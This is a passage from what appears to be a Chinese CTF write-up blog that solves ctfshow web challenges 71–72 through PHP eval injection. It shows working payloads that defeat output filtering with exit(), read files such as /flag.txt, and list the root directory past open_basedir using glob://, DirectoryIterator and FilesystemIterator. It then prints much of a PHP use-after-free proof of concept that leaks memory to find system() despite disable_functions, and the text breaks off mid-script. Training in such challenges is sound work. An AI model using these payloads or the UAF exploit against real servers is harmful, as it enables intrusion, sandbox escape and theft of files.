class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>  <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p><code>ob_get_contents</code> — 返回输出缓冲区的内容<br><code>ob_end_clean</code> — 清空（擦除）缓冲区并关闭输出缓冲<br>截取了读flag的回显<br>数字和字母会被<code>preg_replace</code>替换为问号<br>一种解法是<code>后接exit() 或者 die()</code>结束程序，后面读取缓冲区失效<br><code>c=var_export(scandir(&#39;/&#39;));;exit();</code><br><code>c=include(&#39;/flag.txt&#39;);exit();``require</code> <code>readgzfile</code>都可以<br>另一种是直接输出缓冲区<br><code>ob_flush</code> — 冲刷出（送出）输出缓冲区中的内容<br><code>ob_end_flush</code> — 冲刷出（送出）输出缓冲区内容并关闭缓冲区<br><code>c=var_export(scandir(&#39;/&#39;));ob_flush ();</code><br><code>c=var_export(scandir(&#39;/&#39;));ob_end_flush ();</code></p><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>源码同上题<br><code>c=var_export(scandir(&#39;/&#39;));;exit();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">scandir</span>(): open_basedir restriction in effect. <span class="hljs-title function_ invoke__">File</span>(/) is not within the allowed <span class="hljs-title function_ invoke__">path</span>(s): (/<span class="hljs-keyword">var</span>/www/html/) in /<span class="hljs-keyword">var</span>/www/html/index.<span class="hljs-title function_ invoke__">php</span>(<span class="hljs-number">19</span>) : <span class="hljs-keyword">eval</span>()<span class="hljs-string">&#x27;d code on line 1</span><br></code></pre></td></tr></table></figure><p>读不到根目录<br><code>c=var_export(glob(&quot;*&quot;));;exit();</code> 查看当前目录<br>看到flag.php在当前目录<br><code>c=readgzfile(&#39;flag.php&#39;);exit();</code>  回显 <code>$flag=&quot;秀秀得了,这次不在这里&quot;;</code> 被骗了<br><code>open_basedir</code>是<code>php.ini</code>中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域<br>题目限制了<code>open_basedir</code>在当前目录，要查看根目录文件需要绕过<code>open_basedir</code><br><code>glob</code>伪协议在筛选目录时不受<code>open_basedir</code>制约</p><h5 id="利用-scandir-glob"><a href="#利用-scandir-glob" class="headerlink" title="利用 scandir()+glob://"></a>利用 scandir()+glob://</h5><p><code>c=var_export(scandir(&#39;glob:///*&#39;));exit();</code><br><img src="/mdimg/ctfshow77/13.png"></p><h5 id="DirectoryIterator类-glob-协议"><a href="#DirectoryIterator类-glob-协议" class="headerlink" title="DirectoryIterator类 + glob://协议"></a>DirectoryIterator类 + glob://协议</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125; <br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/14.png"></p><h5 id="FilesystemIterator类-glob-协议"><a href="#FilesystemIterator类-glob-协议" class="headerlink" title="FilesystemIterator类 + glob://协议"></a>FilesystemIterator类 + glob://协议</h5><p>FilesystemIterator继承自DirectoryIterator，在显示上与父类略微有区别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br><span class="hljs-variable">$dir_array</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-variable">$dir_array</span>[] = <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&#x27;glob:///.*&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-variable">$dir_array</span>[] = <span class="hljs-variable">$d</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$dir_array</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir_array</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/mdimg/ctfshow77/15.png"></p><h5 id="利用-opendir-readdir-glob"><a href="#利用-opendir-readdir-glob" class="headerlink" title="利用 opendir()+readdir()+glob://"></a>利用 opendir()+readdir()+glob://</h5><p><code>opendir</code>作用为打开目录句柄<br><code>readdir</code>作用为从目录句柄中读取目录<br>通过glob协议 <code>glob:///*</code> 循环读取并输出根目录的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>get：<code>?cmd=glob:///*</code><br><img src="/mdimg/ctfshow77/16.png"></p><h5 id="利用symlink-软链接-失败-symlink-被ban了"><a href="#利用symlink-软链接-失败-symlink-被ban了" class="headerlink" title="利用symlink() 软链接 失败  symlink()被ban了"></a>利用symlink() 软链接 失败  symlink()被ban了</h5><p><img src="/mdimg/ctfshow77/17.png"></p><h5 id="读文件-1"><a href="#读文件-1" class="headerlink" title="读文件"></a>读文件</h5><p><code>open_basedir</code>对命令执行函数没有限制，但这里 <code>disable_function</code>把<code>system</code>等都ban了<br>UAF即为Use After Free。也就是使用了已经被释放的内存，最终导致内存崩溃或任意代码被执行的漏洞。UAF漏洞常见于浏览器中，如IE、Chrome、Firefox等<br>看不懂…….uaf<br>官方uaf脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>            <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br> <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br> <br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> <br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>                <br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br> <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br> <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br> <br>        <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br> <br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ 